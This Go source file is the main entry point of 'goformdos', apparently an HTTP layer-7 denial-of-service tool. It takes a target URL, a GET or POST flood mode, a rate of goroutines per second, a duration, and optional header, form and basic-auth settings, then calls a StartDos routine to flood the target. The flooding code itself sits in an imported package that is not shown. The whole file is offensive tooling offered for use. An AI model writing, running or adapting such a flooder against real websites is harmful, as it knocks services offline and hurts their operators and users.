// Author: PiereLucas

package main

import (
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/pierelucas/goformdos/goformdos2/configparser"
	"github.com/pierelucas/goformdos/goformdos2/dos/l7"
)

var (
	flagMode = flag.String(
		"m",
		"",
		"Choose between POST and GET flood")
	flagForms = flag.String(
		"fp",
		"",
		"File containing form parameters [Only needed for POST mode]")
	flagHeaders = flag.String(
		"hp",
		"",
		"File containing header parameters")
	flagAuth = flag.String(
		"a",
		"",
		"Basic HTTP Authentication")
	flagURL = flag.String(
		"u",
		"",
		"Target url")
	flagThreads = flag.Int(
		"r",
		0,
		"Define how many routines/s (per second) should running")
	flagTime = flag.Int(
		"t",
		0,
		"Define dos duration (seconds)")
	flagOutput = flag.String(
		"o",
		"",
		"output logfile (lot of Foo)")
)

// validate command line user arguments
func validateArgs() (err error) {
	flag.Parse() // Parse Flags

	// ## Begin anonyme functions ########################################
	// validateUrl -- validate the given URL
	validateURL := func(urladdr string) error {
		_, err := url.ParseRequestURI(urladdr)
		if err != nil {
			e := fmt.Errorf("%s is invalid url", urladdr)
			return e
		}
		return nil
	}

	// validatePath -- validate filePath
	validatePath := func(fp string) (bool, error) {
		_, err := os.Stat(fp)
		if err != nil {
			return false, err
		}
		return true, err
	}
	// ## End anonyme functions ##########################################

	// check if the general flags are set
	if *flagURL == "" || *flagMode == "" || *flagThreads <= 0 || *flagTime <= 0 {
		err = fmt.Errorf("ERROR: please define arguments or use -h for help")
		return err
	}

	// validate and correct flagMode grammar
	if err = func() error {
		if strings.EqualFold("GET", *flagMode) {
			*flagMode = "GET"
		} else if strings.EqualFold("POST", *flagMode) {
			*flagMode = "POST"
		} else {
			err = fmt.Errorf("ERROR: the mode [%s] does not exist", *flagMode)
			return err
		}
		return nil
	}(); err != nil {
		return err
	}

	// validate URL
	if err = validateURL(*flagURL); err != nil {
		return err
	}

	// validate formfilepath
	if err = func() error {
		// check if forms set with GET or not set with POST
		if *flagForms == "" && strings.EqualFold("POST", *flagMode) {
			err = fmt.Errorf("ERROR: POST mode is set without a form file")
			return err
		}

		if *flagForms != "" && strings.EqualFold("GET", *flagMode) {
			err = fmt.Errorf("ERROR: GET mode doesn't need a formfile")
			return err
		}

		// validate formFilePath
		if strings.EqualFold("POST", *flagMode) {
			_, err = validatePath(*flagForms)
			if err != nil {
				err = fmt.Errorf("ERROR: %s not exist or is not accesible", *flagForms)
				return err
			}
		}
		return nil
	}(); err != nil {
		return err
	}

	// validate headerfilepath
	if *flagHeaders != "" {
		if _, err = validatePath(*flagHeaders); err != nil {
			err = fmt.Errorf("ERROR: %s not exist or is not accesible", *flagHeaders)
			return err
		}
	}

	// validate log output (logfile)
	if *flagOutput != "" {
		if _, err := validatePath(*flagOutput); err != nil {
			err = fmt.Errorf("Error: %s not exists or ist not accesible", *flagOutput)
			return err
		}
	}

	// validate authorization
	if *flagAuth != "" {
		if !strings.Contains(*flagAuth, ":") {
			err = fmt.Errorf("ERROR: %s is not a valid username:password", *flagAuth)
			return err
		}
	}

	return nil // Everything seems to be okay :)
}

func checkError(err error) {
	if err != nil {
		fmt.Print(err)
		os.Exit(1)
	}
}

func main() {
	err := validateArgs() // validate arguments
	checkError(err)

	// set-up logging
	log.SetFlags(log.LstdFlags)
	log.SetPrefix("goformdos\t")
	if *flagOutput != "" {
		f, err := os.OpenFile(*flagOutput, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Print(err)
			os.Exit(1)
		}
		defer f.Close() // defer = LIFO

		// Set up Logger
		/*
			iLog := log.New(f, "gocrypt-cli", log.LstdFlags)
		*/

		log.SetOutput(f) // set uputput logfile
	}
	log.Println("goformdos-------------------------------")
	log.Println("INFO: Goformdos 2.3 | Author: PiereLucas | License: MIT")

	// get the start time of the program for later print out of execution time
	start := time.Now()
	// print the execution time at the end of main
	defer func() {
		//fmt.Print("\033[H\033[2J") // clear terminal
		duration := time.Since(start)
		log.Println("INFO: time took for execution:", duration)
		log.Println("INFO: EXIT(0)")
		log.Println("-------------------------------goformdos")
	}()

	layer7 := l7.New(*flagMode, *flagTime, *flagThreads, *flagURL) // Initialize new layer7.Layer7 object

	var wg sync.WaitGroup

	if *flagMode == "GET" && *flagHeaders != "" { // check if headerfile is set
		// logging
		log.Printf("INFO: Load Headerfile %s", *flagHeaders)

		// allocate memory
		var headers = make(map[string]interface{})

		// Parse headers from file
		wg = sync.WaitGroup{}
		wg.Add(1)
		go configparser.ParseJSON(&headers, *flagHeaders, &wg)
		wg.Wait()

		// Append headers to dos.TargetInf and his underlaying structure's
		wg = sync.WaitGroup{}
		wg.Add(1)
		go layer7.AppendJSON("HEADERS", headers, &wg) // Intialize headers
		wg.Wait()

	} else if *flagMode == "POST" {
		// check if headerfile is set
		if *flagHeaders != "" {
			// logging
			log.Printf("INFO: Load Headerfile %s", *flagHeaders)
			log.Printf("INFO: Load Formfile %s", *flagForms)

			// allocate memory
			var forms = make(map[string]interface{})
			var headers = make(map[string]interface{})

			// Parse forms and headers from file
			wg = sync.WaitGroup{}
			wg.Add(2)
			go configparser.ParseJSON(&forms, *flagForms, &wg)
			go configparser.ParseJSON(&headers, *flagHeaders, &wg)
			wg.Wait()

			// Append forms and headers to dos.TargetInf and his underlaying structure's
			wg = sync.WaitGroup{}
			wg.Add(2)
			go layer7.AppendJSON("FORMS", forms, &wg)     // Intialize forms
			go layer7.AppendJSON("HEADERS", headers, &wg) // Intialize headers
			wg.Wait()
		} else {
			//logging
			log.Printf("INFO: Load Formfile %s", *flagForms)

			// allocate memory
			var forms = make(map[string]interface{})

			// Parse forms and headers from file
			wg = sync.WaitGroup{}
			wg.Add(1)
			go configparser.ParseJSON(&forms, *flagForms, &wg)
			wg.Wait()

			// Append forms and headers to dos.TargetInf and his underlaying structure's
			wg = sync.WaitGroup{}
			wg.Add(1)
			go layer7.AppendJSON("FORMS", forms, &wg) // Intialize forms
			wg.Wait()
		}
	}

	// Append Authorization (if set)
	func() {
		if *flagAuth != "" {
			tempSlice := strings.Split(*flagAuth, ":")
			layer7.AddAuth(tempSlice[0], tempSlice[1])
			tempSlice = nil
		}
	}()

	// Starting the DOS function
	wg = sync.WaitGroup{}
	wg.Add(1)
	go layer7.StartDos(&wg)
	wg.Wait()

	return
}
